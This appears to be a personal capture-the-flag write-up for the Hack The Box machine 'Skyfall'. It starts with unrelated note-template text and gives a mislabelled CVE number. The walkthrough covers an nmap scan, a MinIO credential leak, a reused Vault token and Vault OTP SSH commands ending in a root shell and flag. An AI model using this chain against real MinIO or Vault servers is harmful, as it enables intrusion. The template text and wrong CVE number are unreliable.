sup:: [[Home]]
tags:: #map 

 🗃

![[Pasted image 20240205173101.png]]
This is the "Map of Content" for the LYT Kit. Here you can:

- Learn about the LYT Framework.
- Learn about how MOCs literally re-write the game.
- Create living notes in a process called *note-making*.
- Use MOCs to generate massive amounts of personal value.
- Build your Home note so you can effectively scale your PKM.
- Use the ACCESS folder structure to effectively hold all your notes.
- Learn about how to use "efforts" instead of projects.

Let's get started...

---
### Steps
1.  **Start your vpn**
	Go to the directory where your downloaded vpn and start the vpn as shown below
	
![[Pasted image 20240114130711.png]]

2. Run an nmap scan on the host:
![[Pasted image 20240205173906.png]]

┌──(kali㉿kali)-[~]
└─$  sudo nmap -sC -sV 10.10.11.254
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2024-02-05 17:22 EST
Nmap scan report for skyfall.htb (10.10.11.254)
Host is up (0.24s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Skyfall - Introducing Sky Storage!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.22 seconds

┌──(kali㉿kali)-[~]
└─$ 

3. Added the ip with the corresponding name in the /etc/hosts file:

4. Visited skylab.htb in the browser:
![[Pasted image 20240205174449.png]]

5. viewed the source code to see if we can anything. So we happen to find this URL while reviewing the code:

![[Pasted image 20240205175505.png]]

6. We will also add the URL to our /etc/hosts file:

7. Navigated to the site:

![[Pasted image 20240205175755.png]]

![[Pasted image 20240205180016.png]]

9. So, we try to use the username and password to login for a demo as provided on the form:

![[Pasted image 20240205180203.png]]

10. After clicking on MimIO Metrics tab, I got this:

![[Pasted image 20240205182739.png]]

11. So, I went ahead to enter this %0a and got the following result page:
    http://demo.skyfall.htb/metrics%0a

![[Pasted image 20240205184040.png]]

Notice on the last line a URL for demo.skylab.htb

![[Pasted image 20240205185625.png]]

11. Added this to the /etc/hosts file:

![[Pasted image 20240205185448.png]]

12. I decided to visit this page for a potential Mimio CVE on github:

![[Pasted image 20240205190652.png]]

13. Clicking on CVE-3035-28432.py exploit to view the script:

![[Pasted image 20240205191747.png]]

14. Launched Burpsuite and copy the URL to the browse saved in the /etc/hosts file prd23-s3-backend.skyfall.htb/:

![[Pasted image 20240205192226.png]]

15. Now, go back to the resporsitory and get the target URL as highlighted earlier:

![[Pasted image 20240205194154.png]]

16. In Burpsuite I am able to manipulate the request in Repeater tab and Send it back to the server:

![[Pasted image 20240205221331.png]]

We can see the MINIO ROOT PASSWORD in the response field:

![[Pasted image 20240205221838.png]]

17. Download the Minio client:

![[Pasted image 20240205223040.png]]
![[Pasted image 20240205223804.png]]

![[Pasted image 20240205230212.png]]

18. Added the myminio alias for your MinIO server using the `mc` command. Now I can proceed with MinIO client operations on the MinIO server using this alias:

![[Pasted image 20240205230816.png]]

19. List the buckets:

![[Pasted image 20240205231930.png]]

20. Copy the backup file from Mimio server t:

![[Pasted image 20240205232447.png]]
![[Pasted image 20240205232712.png]]

21. List the contents of the bash configuration file:

![[Pasted image 20240205233418.png]]

![[Pasted image 20240205233516.png]]

22. Add the Vault api to the /etc/hosts file together with the other 10.10.11.254 URLs

23. Download the vault client:

kali@kali:~$  wget https://releases.hashicorp.com/vault/1.15.5/vault_1.15.5_linux_amd64.zip

kali@kali:~$  unzip vault_1.15.5_linux_amd64.zip 
Archive:  vault_1.15.5_linux_amd64.zip
  inflating: vault                   
kali@kali:~$

![[Pasted image 20240205234621.png]]

![[Pasted image 20240206000034.png]]

24. Now, let's run the export the vault script and run it:

![[Pasted image 20240206000939.png]]

25. Enter this token from the .bashrc config file we saw it from:

hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE

![[Pasted image 20240206003613.png]]

![[Pasted image 20240206004312.png]]

26. Run the command to help SSH into the system via Vault:

![[Pasted image 20240206011039.png]]

27. Listing the files in the user's home directory we could see the user flag and view it:

![[Pasted image 20240206011435.png]]

28. what commands can this user run as sudo without a password:

![[Pasted image 20240206014234.png]]

29. Remove and create back the debug.log file:

![[Pasted image 20240206020439.png]]

30. Now, viewing the contents of the file:

![[Pasted image 20240206020641.png]]

31. Exiting the process and starting again for the root:

![[Pasted image 20240206024119.png]]
![[Pasted image 20240206024146.png]]

32. Changing the role now to root:

![[Pasted image 20240207003210.png]]
![[Pasted image 20240207003305.png]]

Actual commands to get root:

kali@kali:~$  export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
kali@kali:~$  ./vault login
Token (will be hidden): 
WARNING! The VAULT_TOKEN environment variable is set! The value of this
variable will take precedence; if this is unwanted please unset VAULT_TOKEN or
update its value accordingly.

Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                hvs.I0ewVsmaKU1SwVZAKR3T0mmG
token_accessor       bXBeXR3r92WGQ8XgEDx6pIFu
token_duration       ∞
token_renewable      false
token_policies       ["root"]
identity_policies    []
policies             ["root"]
kali@kali:~$ export VAULT_TOKEN="hvs.I0ewVsmaKU1SwVZAKR3T0mmG"
kali@kali:~$ export VAULT_NAMESPACE="root"
kali@kali:~$ ./vault ssh -role admin_otp_key_role -mode OTP -strict-host-key-checking=no root@10.10.11.254
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: 184643cc-ed2b-7156-e536-8f7762350f66
Password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-92-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Jan 30 12:17:37 2024
root@skyfall:~# ls
minio  root.txt  sky_storage  vault
root@skyfall:~# cat root.txt
3b123dc3f82223d5b0586fbed83e93c9
root@skyfall:~#